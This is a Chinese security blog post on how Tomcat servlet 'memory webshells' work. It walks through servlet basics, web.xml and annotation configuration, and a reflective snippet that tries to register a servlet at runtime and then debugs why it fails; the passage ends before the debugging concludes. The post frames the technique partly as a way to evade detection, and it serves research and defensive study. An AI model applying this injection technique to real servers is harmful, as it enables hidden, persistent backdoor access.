    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">Tomcat内存马实现原理解析-servlet内存马</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-31 10:25:16" itemprop="dateCreated datePublished" datetime="2020-12-31T10:25:16+08:00">2020-12-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-05 12:08:07" itemprop="dateModified" datetime="2021-01-05T12:08:07+08:00">2021-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        除了通过Filter实现的内存马，也可以使用servlet，listener等实现内存马，不同的实现方式需要不同的查杀方式，有可能使用不同类型的内存马就可以绕过查杀，本片文章将带着大家了解servlet的入门、tomcat下servlet的实现、servlet内存马的实现。</p>
<h2 id="servlet基础入门"><a href="#servlet基础入门" class="headerlink" title="servlet基础入门"></a>servlet基础入门</h2><h3 id="什么是servlet"><a href="#什么是servlet" class="headerlink" title="什么是servlet?"></a>什么是servlet?</h3><h4 id="servlet基本介绍"><a href="#servlet基本介绍" class="headerlink" title="servlet基本介绍"></a>servlet基本介绍</h4><p>​        servlet是一个Java应用程序，运行在服务器端，用来处理客户端请求并作出响应的程序。servlet没有main方法不能独立运行，需要使用servlet容器比如tomcat来创建。当我们通过URL来访问servlet，首先会在servlet容器中判断该URL是由哪个servlet处理的，当前容器中是否有这个servlet实例，如果没有则创建servlet实例，并交由对应servlet的service方法来处理请求，处理结束后再返回web服务器。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231105141162.png" alt="image-20201231105141162"></p>
<p>​        servlet接口分别有如下几个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException</span>; <span class="comment">// init方法，创建好实例后会被立即调用，仅调用一次。</span></span><br><span class="line"></span><br><span class="line">    <span class="function">ServletConfig <span class="title">getServletConfig</span><span class="params">()</span></span>;<span class="comment">//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException</span>;  <span class="comment">//每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。</span></span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getServletInfo</span><span class="params">()</span></span>;<span class="comment">//返回有关servlet的信息，如作者、版本和版权.</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;<span class="comment">//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" title="servlet生命周期"></a>servlet生命周期</h4><p>​        实例化：在第一次访问或启动tomcat时，tomcat会调用此无参构造方法实例化servlet。默认情况下在tomcat开启的时候不会实例化我们自定义的servlet，当我们第一次访问该servlet的时候才会去创建实例。org.apache.catalina.core.DefaultInstanceManager#newInstance(java.lang.String)</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113046827.png" alt="image-20201231113046827"></p>
<p>​        初始化：tomcat在实例化此servlet后，会立即调用init方法初始化servlet。org.apache.catalina.core.StandardWrapper#initServlet</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113147029.png" alt="image-20201231113147029"></p>
<p>就绪：容器收到请求后调用servlet的service方法来处理请求。org.apache.catalina.core.ApplicationFilterChain#internalDoFilter，servlet.service()方法会在过滤器链执行结束后执行。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113326086.png" alt="image-20201231113326086"></p>
<p>销毁：容器依据自身算法删除servlet对象，删除前会调用destory方法，重写destroy方法，关闭tomcat时会执行servlet的destory方法。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113716361.png" alt="image-20201231113716361"></p>
<p>​    总体过程如下所示：</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231115816760.png" alt="image-20201231115816760"></p>
<h4 id="servlet实现类介绍"><a href="#servlet实现类介绍" class="headerlink" title="servlet实现类介绍"></a>servlet实现类介绍</h4><p><strong>GenericServlet</strong></p>
<p>​        GenericServlet是Servlet 接口和 ServletConfig 接口的实现类. 但是一个抽象类，其中的 service 方法为抽象方法。也就是说如果继承了这个抽象类，只有service方法是必须重写的。</p>
<p><strong>HttpServlet</strong></p>
<p>​        HttpServlet是GenericServlet的子类，在HttpServlet中对GenericServlet进行了扩展重写了service方法，根据不同的请求方式，调用不同的方法处理请求。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String method = req.getMethod();</span><br><span class="line">    <span class="keyword">long</span> lastModified;</span><br><span class="line">    <span class="keyword">if</span> (method.equals(<span class="string">"GET"</span>)) &#123;</span><br><span class="line">        lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">        <span class="keyword">if</span> (lastModified == -<span class="number">1L</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">long</span> ifModifiedSince;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ifModifiedSince = req.getDateHeader(<span class="string">"If-Modified-Since"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">                ifModifiedSince = -<span class="number">1L</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ifModifiedSince &lt; lastModified / <span class="number">1000L</span> * <span class="number">1000L</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">                <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resp.setStatus(<span class="number">304</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"HEAD"</span>)) &#123;</span><br><span class="line">        lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">        <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">        <span class="keyword">this</span>.doHead(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"PUT"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPut(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"DELETE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doDelete(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"OPTIONS"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doOptions(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"TRACE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doTrace(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String errMsg = lStrings.getString(<span class="string">"http.method_not_implemented"</span>);</span><br><span class="line">        Object[] errArgs = <span class="keyword">new</span> Object[]&#123;method&#125;;</span><br><span class="line">        errMsg = MessageFormat.format(errMsg, errArgs);</span><br><span class="line">        resp.sendError(<span class="number">501</span>, errMsg);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>HttpServletRequest和HttpServletResponse</strong></p>
<p>​        在HTTPServlet.service()中传入了HttpServletRequest和HttpServletResponse对象,通过这两个对象可以获得请求和响应中的信息。</p>
<p><strong>HttpServletRequest</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getParameter() <span class="comment">//根据参数的内容获取参数值</span></span><br><span class="line">getRequestURI() <span class="comment">//获取请求的URI</span></span><br><span class="line">getQueryString() <span class="comment">//获取get请求中？后的内容</span></span><br><span class="line">getServletPath() <span class="comment">//获取servlet的路径</span></span><br><span class="line">getCookies() <span class="comment">//获取cookie中的信息</span></span><br></pre></td></tr></table></figure>

<p><strong>HttpServletResponse</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addCookie() <span class="comment">//添加cookie</span></span><br><span class="line">sendRedirect() <span class="comment">//设置重定向</span></span><br><span class="line">getWriter() <span class="comment">// 返回 PrintWriter 对象. 调用该对象的 print() 方法, 将把 print() 中的参数直接打印到客户的浏览器上.</span></span><br></pre></td></tr></table></figure>

<h3 id="如何使用servlet？"><a href="#如何使用servlet？" class="headerlink" title="如何使用servlet？"></a>如何使用servlet？</h3><p>​        servlet的创建和filter的创建类似，也有两种形式：</p>
<ul>
<li>web.xml中配置声明</li>
<li>@WebServlet注解声明</li>
</ul>
<h4 id="web-xml配置servlet"><a href="#web-xml配置servlet" class="headerlink" title="web.xml配置servlet"></a>web.xml配置servlet</h4><p>​        web.xml配置如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt; //servlet 的名字</span><br><span class="line">    &lt;servlet-<span class="class"><span class="keyword">class</span>&gt;<span class="title">HelloWorld</span>&lt;/<span class="title">servlet</span>-<span class="title">class</span>&gt;  //<span class="title">servlet</span>类的全类名</span></span><br><span class="line"><span class="class">&lt;/<span class="title">servlet</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">servlet</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">servlet</span>-<span class="title">name</span>&gt;<span class="title">HelloWorld</span>&lt;/<span class="title">servlet</span>-<span class="title">name</span>&gt;   //<span class="title">servlet</span> 的名字</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/<span class="title">HelloWorld</span>&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;  //访问<span class="title">servlet</span>的路径</span></span><br><span class="line"><span class="class">&lt;/<span class="title">servlet</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        引用一张图来说明容器如何根据请求的url找到处理servlet的类,当我们发起一个请求时，会去判断我们请求的路径是否符合url-pattern匹配的内容，匹配成功会找到对应的servlet-name来处理，再根据servlet-name找到servlet-class来处理。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231135749685.png" alt="image-20201231135749685"></p>
<p>​        实际上同一个servlet类可以对应多个servlet-mapping</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;   //servlet 的名字</span><br><span class="line">    &lt;url-pattern&gt;/test666&lt;/url-pattern&gt;  //访问servlet的路径</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;   //servlet 的名字</span><br><span class="line">    &lt;url-pattern&gt;/HelloWorld&lt;/url-pattern&gt;  //访问servlet的路径</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>​        接下来我们要编写HelloWorld,我们实现的Servlet类需要继承HttpServlet，并重写几个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"servlet has been destory!!!"</span>);</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        由于定义了两个servlet-mapping，因此可以通过不同的路径来请求同一个servlet。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231143118256.png" alt="image-20201231143118256"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231142000181.png" alt="image-20201231142000181"></p>
<h4 id="WebServlet注解配置servlet"><a href="#WebServlet注解配置servlet" class="headerlink" title="WebServlet注解配置servlet"></a>WebServlet注解配置servlet</h4><p>​        通过注解同样可以完成上述的servlet的配置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"HelloWorld"</span>,urlPatterns = &#123;<span class="string">"/HelloWorld"</span>,<span class="string">"/test666"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"servlet has been destory!!!"</span>);</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231144016548.png" alt="image-20201231144016548"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231144029960.png" alt="image-20201231144029960"></p>
<h2 id="动态注册servlet"><a href="#动态注册servlet" class="headerlink" title="动态注册servlet"></a>动态注册servlet</h2><h3 id="失败尝试"><a href="#失败尝试" class="headerlink" title="失败尝试"></a>失败尝试</h3><p>​        之前了解过动态注入Filter的技术，以为实现动态注册servlet的方法应该类似，因此使用下面的代码来实现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Wrapper wrapper = (Wrapper) standardContext.findChild(<span class="string">"test"</span>); <span class="comment">//查看自定义的servlet是否添加成功</span></span><br><span class="line">                    <span class="keyword">if</span>(wrapper ==<span class="keyword">null</span>) &#123;</span><br><span class="line">                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); <span class="comment">//设置state的值，否则执行addservlet方法会报错</span></span><br><span class="line">                        TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); <span class="comment">//创建tomcatservlet实例</span></span><br><span class="line">                        ServletRegistration.Dynamic reg = servletContext.addServlet(<span class="string">"test"</span>, tomcatServlet);   <span class="comment">//添加servlet</span></span><br><span class="line">                        reg.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">                        reg.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">                        reg.addMapping(<span class="string">"/test666"</span>);  <span class="comment">//添加URL地址映射关系</span></span><br><span class="line">                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED); <span class="comment">//将state的值还原</span></span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>

<p>​        但是使用这种方式动态添加servlet后访问却是404。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231152513184.png" alt="image-20201231152513184"></p>
<h3 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h3><h4 id="mapping未添加成功"><a href="#mapping未添加成功" class="headerlink" title="mapping未添加成功"></a>mapping未添加成功</h4><p>​        一般来讲，我们添加的mapping会被保存到<code>standardContext.servletMappings</code>中，可以查看该字段来查看mapping是否添加成功，这里可以看到自定义的mapping是添加成功了。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231153355218.png" alt="image-20201231153355218"></p>
<h4 id="servlet未添加成功"><a href="#servlet未添加成功" class="headerlink" title="servlet未添加成功"></a>servlet未添加成功</h4><p>​        跟进org.apache.catalina.core.ApplicationContext#addServlet(java.lang.String, java.lang.String, javax.servlet.Servlet, java.util.Map&lt;java.lang.String,java.lang.String&gt;） ，我抽出一些比较关键的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Wrapper wrapper = (Wrapper) context.findChild(servletName);  <span class="comment">//检测context中是否已经包含了servlet。</span></span><br><span class="line">  <span class="keyword">if</span> (wrapper == <span class="keyword">null</span>) &#123;  <span class="comment">//由于这个servlet是动态添加的，因此wrapper的内容为空</span></span><br><span class="line">            wrapper = context.createWrapper(); <span class="comment">//创建一个wrapper</span></span><br><span class="line">            wrapper.setName(servletName);  <span class="comment">//设置servlet的name</span></span><br><span class="line">            context.addChild(wrapper);  <span class="comment">//将wrapper添加到当前的context中</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="keyword">null</span>) &#123;  <span class="comment">//判断servlet是否为空，由于传入了servlet对象，因此会执行else中的内容</span></span><br><span class="line">            wrapper.setServletClass(servletClass);</span><br><span class="line">            Class&lt;?&gt; clazz = Introspection.loadClass(context, servletClass);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                annotation = clazz.getAnnotation(ServletSecurity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wrapper.setServletClass(servlet.getClass().getName());  <span class="comment">//wrapper中添加servlet</span></span><br><span class="line">            wrapper.setServlet(servlet);  <span class="comment">//设置servlet对象</span></span><br><span class="line">            <span class="keyword">if</span> (context.wasCreatedDynamicServlet(servlet)) &#123;</span><br><span class="line">                annotation = servlet.getClass().getAnnotation(ServletSecurity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的代码，将servlet的实例和servletClass等属性添加到context中，servlet添加也没有问题。执行addservlet和addMapping后，可以看到已经将servlet的instance对象、mappings映射、servletClass等内容添加到context中。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231160006153.png" alt="image-20201231160006153"></p>
<h4 id="tomcat-加载servlet分析"><a href="#tomcat-加载servlet分析" class="headerlink" title="tomcat 加载servlet分析"></a>tomcat 加载servlet分析</h4><p>​        接下来我们就要分析为什么servlet添加成功后还是无法访问,执行servlet的service请求，一定会经过org.apache.catalina.core.ApplicationFilterChain#internalDoFilter的servlet.service()方法,因此可以在这里打断点分析问题，访问自定义的servlet的url，这里对应的servlet类型并不是定义的TomcatServlet，需要向上追钟servlet是在哪里定义的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231160647998.png" alt="image-20201231160647998"></p>
<p>​        在ApplicationFilterChain中仅有org.apache.catalina.core.ApplicationFilterChain#setServlet会为servlet赋值，因此可以在setServlet下断点查看。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231161437760.png" alt="image-20201231161437760"></p>
<p>​        继续向上跟踪调用 org.apache.catalina.core.ApplicationFilterFactory#createFilterChain中传入了servlet。</p>
